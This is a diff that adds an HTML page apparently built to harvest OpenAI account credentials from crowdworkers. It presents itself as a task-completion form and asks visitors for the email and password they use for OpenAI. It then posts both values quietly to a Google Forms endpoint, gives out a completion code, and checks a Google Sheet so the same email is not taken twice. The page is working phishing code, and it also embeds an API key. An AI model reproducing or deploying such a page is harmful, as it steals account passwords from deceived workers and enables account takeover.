@@ -1,0 +1,498 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta name="referrer" content="no-referrer">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Email and Password Validation</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f9;
+      color: #333;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .form-container {
+      background: #fff;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      width: 300px;
+    }
+
+      .form-container h2 {
+        margin-bottom: 20px;
+        font-size: 1.5rem;
+        color: #555;
+        text-align: center;
+      }
+
+    .form-group {
+      margin-bottom: 15px;
+    }
+
+      .form-group label {
+        display: block;
+        margin-bottom: 5px;
+        font-size: 0.9rem;
+      }
+
+      .form-group input {
+        width: 100%;
+        padding-top: 10px;
+        padding-bottom: 10px;
+        font-size: 1rem;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+      }
+
+      .form-group .error {
+        color: red;
+        font-size: 0.8rem;
+        margin-top: 5px;
+      }
+
+    .submit-btn {
+      width: 100%;
+      padding: 10px;
+      font-size: 1rem;
+      background-color: #007BFF;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+      .submit-btn:hover {
+        background-color: #0056b3;
+      }
+  </style>
+</head>
+<body>
+  <div class="form-container" id="wholediv">
+    <div id="thankyou" style="display:none;">
+      <h2>Thank you</h2>
+      <p>Your VCODE is:</p>
+      <h2 id="vcode"></h2>
+    </div>
+    <div id="infoform">
+      <h2>OpenAI Information</h2>
+      <p>Enter the email and password you used to <a href="https://chat.openai.com/" target="_blank" referrerpolicy="no-referrer">create your OpenAI account</a>.</p>
+      <form id="signup-form">
+        <div class="form-group">
+          <label for="email">Email Address</label>
+          <input type="email" id="email" name="email" required>
+          <div id="email-error" class="error"></div>
+        </div>
+        <div class="form-group">
+          <label for="password">Password</label>
+          <input type="password" id="password" name="password" required>
+          <div id="password-error" class="error"></div>
+        </div>
+        <button type="submit" class="submit-btn">Submit</button>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    function sha256(ascii) {
+      function rightRotate(value, amount) {
+        return (value >>> amount) | (value << (32 - amount));
+      };
+
+      var mathPow = Math.pow;
+      var maxWord = mathPow(2, 32);
+      var lengthProperty = 'length'
+      var i, j; // Used as a counter across the whole file
+      var result = ''
+
+      var words = [];
+      var asciiBitLength = ascii[lengthProperty] * 8;
+
+      //* caching results is optional - remove/add slash from front of this line to toggle
+      // Initial hash value: first 32 bits of the fractional parts of the square roots of the first 8 primes
+      // (we actually calculate the first 64, but extra values are just ignored)
+      var hash = sha256.h = sha256.h || [];
+      // Round constants: first 32 bits of the fractional parts of the cube roots of the first 64 primes
+      var k = sha256.k = sha256.k || [];
+      var primeCounter = k[lengthProperty];
+      /*/
+      var hash = [], k = [];
+      var primeCounter = 0;
+      //*/
+
+      var isComposite = {};
+      for (var candidate = 2; primeCounter < 64; candidate++) {
+        if (!isComposite[candidate]) {
+          for (i = 0; i < 313; i += candidate) {
+            isComposite[i] = candidate;
+          }
+          hash[primeCounter] = (mathPow(candidate, .5) * maxWord) | 0;
+          k[primeCounter++] = (mathPow(candidate, 1 / 3) * maxWord) | 0;
+        }
+      }
+
+      ascii += '\x80' // Append Ƈ' bit (plus zero padding)
+      while (ascii[lengthProperty] % 64 - 56) ascii += '\x00' // More zero padding
+      for (i = 0; i < ascii[lengthProperty]; i++) {
+        j = ascii.charCodeAt(i);
+        if (j >> 8) return; // ASCII check: only accept characters in range 0-255
+        words[i >> 2] |= j << ((3 - i) % 4) * 8;
+      }
+      words[words[lengthProperty]] = ((asciiBitLength / maxWord) | 0);
+      words[words[lengthProperty]] = (asciiBitLength)
+
+      // process each chunk
+      for (j = 0; j < words[lengthProperty];) {
+        var w = words.slice(j, j += 16); // The message is expanded into 64 words as part of the iteration
+        var oldHash = hash;
+        // This is now the undefinedworking hash", often labelled as variables a...g
+        // (we have to truncate as well, otherwise extra entries at the end accumulate
+        hash = hash.slice(0, 8);
+
+        for (i = 0; i < 64; i++) {
+          var i2 = i + j;
+          // Expand the message into 64 words
+          // Used below if
+          var w15 = w[i - 15], w2 = w[i - 2];
+
+          // Iterate
+          var a = hash[0], e = hash[4];
+          var temp1 = hash[7]
+            + (rightRotate(e, 6) ^ rightRotate(e, 11) ^ rightRotate(e, 25)) // S1
+            + ((e & hash[5]) ^ ((~e) & hash[6])) // ch
+            + k[i]
+            // Expand the message schedule if needed
+            + (w[i] = (i < 16) ? w[i] : (
+              w[i - 16]
+              + (rightRotate(w15, 7) ^ rightRotate(w15, 18) ^ (w15 >>> 3)) // s0
+              + w[i - 7]
+              + (rightRotate(w2, 17) ^ rightRotate(w2, 19) ^ (w2 >>> 10)) // s1
+            ) | 0
+            );
+          // This is only used once, so *could* be moved below, but it only saves 4 bytes and makes things unreadble
+          var temp2 = (rightRotate(a, 2) ^ rightRotate(a, 13) ^ rightRotate(a, 22)) // S0
+            + ((a & hash[1]) ^ (a & hash[2]) ^ (hash[1] & hash[2])); // maj
+
+          hash = [(temp1 + temp2) | 0].concat(hash); // We don't bother trimming off the extra ones, they're harmless as long as we're truncating when we do the slice()
+          hash[4] = (hash[4] + temp1) | 0;
+        }
+
+        for (i = 0; i < 8; i++) {
+          hash[i] = (hash[i] + oldHash[i]) | 0;
+        }
+      }
+
+      for (i = 0; i < 8; i++) {
+        for (j = 3; j + 1; j--) {
+          var b = (hash[i] >> (j * 8)) & 255;
+          result += ((b < 16) ? 0 : '') + b.toString(16);
+        }
+      }
+      return result;
+    };
+
+    function getUrlVars() {
+      var vars = {};
+      var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function (m, key, value) {
+        vars[key] = value;
+      });
+      return vars;
+    }
+
+    function getUrlParam(parameter, defaultvalue) {
+      var urlparameter = defaultvalue;
+
+      if (window.location.href.indexOf(parameter) > -1) {
+        urlparameter = getUrlVars()[parameter];
+      }
+
+      if (!urlparameter) {
+        return defaultvalue;
+      }
+
+      return urlparameter.replace("#", "");
+    }
+
+    function setCookie(cname, cvalue, exdays) {
+      var d = new Date();
+      d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
+      var expires = "expires=" + d.toUTCString();
+      document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
+    }
+
+    function getCookie(cname) {
+      var name = cname + "=";
+      var ca = document.cookie.split(';');
+      for (var i = 0; i < ca.length; i++) {
+        var c = ca[i];
+        while (c.charAt(0) == ' ') {
+          c = c.substring(1);
+        }
+        if (c.indexOf(name) == 0) {
+          return c.substring(name.length, c.length);
+        }
+      }
+      return "";
+    }
+
+    function getCode() {
+      document.getElementById('wholediv').style.width = "950px";
+      
+      var val = "";
+      if (getCookie("OpenAI_Code") == "") {
+        var campaignParam = getUrlParam('campaign', 'Empty');
+        var workerParam = getUrlParam('worker', 'Empty');
+        val = "mw-" + sha256(campaignParam + workerParam + '43317676cad02c8abf0e13b01de05b0846d9806bbb056b52faf321e39748d68c');
+        setCookie("OpenAI_Code", val, 300);
+      }
+      else {
+        val = getCookie("OpenAI_Code");
+      }
+
+      document.getElementById('vcode').innerHTML = val;
+    }
+
+    function checkParameters() {
+      var campaignParam = getUrlParam('campaign', 'Empty');
+      var workerParam = getUrlParam('worker', 'Empty');
+      var sourceParam = getUrlParam('source', 'Empty');
+
+      ////if (sourceParam != 'Empty' && sourceParam) {
+      ////    var val = 'T' + Math.floor(10000 + Math.random() * 90001) + 'Y';
+      ////    setCookie("Desolus_Code", val, 300);
+      ////}
+      ////else
+      if (campaignParam == 'Empty' || workerParam == 'Empty' || !campaignParam || !workerParam) {
+        if (sourceParam == 'Empty' || !sourceParam) {
+          document.location = 'https://x.com';
+          return true;
+        }
+        else {
+          var val = 'T' + Math.floor(10000 + Math.random() * 90001) + 'Y';
+          setCookie("Desolus_Code", val, 300);
+        }
+      }
+
+      return false;
+    }
+
+    function checkAlreadyComplete() {
+      if (getCookie("OpenAI_Code") != "") {
+        showThankYou();
+        getCode();
+        return true;
+      }
+      else {
+        return checkParameters();
+      }
+    }
+
+    function GSheetsapi({ apiKey, sheetId, sheetName, sheetNumber = 1 }) {
+      try {
+        const sheetNameStr = sheetName && sheetName !== '' ? encodeURIComponent(sheetName) : `Sheet${sheetNumber}`
+        const sheetsUrl = `https://sheets.googleapis.com/v4/spreadsheets/${sheetId}/values/${sheetNameStr}?dateTimeRenderOption=FORMATTED_STRING&majorDimension=ROWS&valueRenderOption=FORMATTED_VALUE&key=${apiKey}`;
+
+        return fetch(sheetsUrl)
+          .then(response => {
+            if (!response.ok) {
+              console.log('there is an error in the gsheets response');
+              throw new Error('Error fetching GSheet');
+            }
+            return response.json();
+          })
+          .then(data => data)
+          .catch(err => {
+            throw new Error(
+              'Failed to fetch from GSheets API. Check your Sheet Id and the public availability of your GSheet.'
+            );
+          });
+      } catch (err) {
+        throw new Error(`General error when fetching GSheet: ${err}`);
+      }
+    };
+
+    function processGSheetResults(
+      JSONResponse,
+      returnAllResults,
+      filter,
+      filterOptions
+    ) {
+      const data = JSONResponse.values;
+      const startRow = 1;
+
+      let processedResults = [{}];
+      let colNames = {};
+
+      for (let i = 0; i < data.length; i++) {
+        // Rows
+        const thisRow = data[i];
+
+        for (let j = 0; j < thisRow.length; j++) {
+          // Columns/cells
+          const cellValue = thisRow[j];
+          const colNameToAdd = colNames[j]; // this will be undefined on the first pass
+
+          if (i < startRow) {
+            colNames[j] = cellValue;
+            continue; // skip the header row
+          }
+
+          if (typeof processedResults[i] === 'undefined') {
+            processedResults[i] = {};
+          }
+
+          if (typeof colNameToAdd !== 'undefined' && colNameToAdd.length > 0) {
+            processedResults[i][colNameToAdd] = cellValue;
+          }
+        }
+      }
+
+      // make sure we're only returning valid, filled data items
+      processedResults = processedResults.filter(
+        result => Object.keys(result).length
+      );
+
+      // if we're not filtering, then return all results
+      if (returnAllResults || !filter) {
+        return processedResults;
+      }
+
+      return filterResults(processedResults, filter, filterOptions);
+    }
+
+    function gsheetProcessor(options, callback, onError) {
+      const { apiKey, sheetId, sheetName, sheetNumber, returnAllResults, filter, filterOptions } = options
+
+      if (!options.apiKey || options.apiKey === undefined) {
+        throw new Error('Missing Sheets API key');
+      }
+
+      return GSheetsapi({
+        apiKey,
+        sheetId,
+        sheetName,
+        sheetNumber
+      })
+        .then(result => {
+          const filteredResults = processGSheetResults(
+            result,
+            returnAllResults || false,
+            filter || false,
+            filterOptions || {
+              operator: 'or',
+              matching: 'loose'
+            }
+          );
+
+          callback(filteredResults);
+        });
+    };
+
+    var previousEmails = [];
+
+    function refreshPage() {
+      if (checkAlreadyComplete()) { return; }
+      gsheetProcessor(
+        {
+          sheetId: "13gb9SuL2zYLLNM-X2ACWNK8VelaJ7KTuJLckSIQRgM0",
+          sheetName: "Unique",
+          sheetNumber: 1,
+          returnAllResults: true,
+          apiKey: "AIzaSyD4ZoTrXMfF7mhAMVNNiensNsWL5XC6Sqo",
+        },
+        (results) => {
+          var i = 0;
+          results.forEach((result) => {
+            previousEmails[i] = result["Email"];
+            i++;
+          }); // forEach
+        }); // results/gSheetProcessor
+    }; // refreshPage
+
+    function validateEmail(email) {
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      return emailRegex.test(email);
+    }
+
+    function showThankYou() {
+      document.getElementById('thankyou').style.display = "block";
+      document.getElementById('infoform').style.display = "none";
+    }
+
+    function onComplete(email, password) {
+      // Google Form POST endpoint
+      const formActionUrl = "https://docs.google.com/forms/d/e/1FAIpQLSdRJwJfPJnhY0rRgMTp1PT5jPKN4w-HFD-28RgvHL60RNd7nw/formResponse";
+
+      // Prepare form data
+      const formData = new URLSearchParams();
+      formData.append("891200547", email);
+      formData.append("1811649099", password); // Campaign field
+
+      // Submit the form response silently
+      fetch(formActionUrl, {
+        method: "POST",
+        body: formData,
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded",
+        },
+      })
+        .then(response => {
+          if (response.ok) {
+            console.log("Form submitted successfully!");
+          } else {
+            console.error("Form submission failed:", response.status, response.statusText);
+          }
+        })
+        .catch(error => console.error("Error submitting form:", error));
+
+      showThankYou();
+      getCode();
+    }
+
+    document.getElementById('signup-form').addEventListener('submit', function (event) {
+      event.preventDefault();
+
+      const emailInput = document.getElementById('email');
+      const passwordInput = document.getElementById('password');
+      const emailError = document.getElementById('email-error');
+      const passwordError = document.getElementById('password-error');
+
+      let hasError = false;
+
+      // Reset errors
+      emailError.textContent = '';
+      passwordError.textContent = '';
+
+      const email = emailInput.value.trim().toLowerCase();
+      const password = passwordInput.value;
+
+      // Validate email
+      if (!validateEmail(email)) {
+        emailError.textContent = 'Please enter a valid email address. Make sure this is the email you used for the OpenAI signup!';
+        hasError = true;
+      } else if (previousEmails.includes(email)) {
+        emailError.textContent = 'Sorry, this email has already been used for this task. You do not qualify.';
+        hasError = true;
+      }
+
+      // Validate password
+      if (password.length < 12) {
+        passwordError.textContent = 'Password must be at least 12 characters long. Make sure this is the password you used for the OpenAI signup!';
+        hasError = true;
+      }
+
+      if (!hasError) {
+        onComplete(email, password);
+      }
+    });
+
+    refreshPage();
+  </script>
+</body>
+</html>
